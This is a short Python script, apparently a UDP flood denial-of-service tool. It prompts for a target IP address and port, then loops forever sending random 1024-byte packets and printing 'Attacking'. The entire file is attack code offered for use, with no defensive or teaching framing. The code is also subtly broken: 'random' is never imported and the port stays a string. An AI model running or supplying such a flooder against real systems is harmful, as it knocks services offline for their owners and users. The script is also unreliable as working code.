import socket
import requests
import colorama
from colorama import Fore, Style
print(Fore.RED + "Enter the target's IP address: ")
target_ip = input()
print("Enter the target's port number: ")
target_port = input()

client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)

while True:
    client_socket.sendto(bytes, (target_ip, target_port))
    print('Attacking {}:{}'.format(target_ip, target_port))
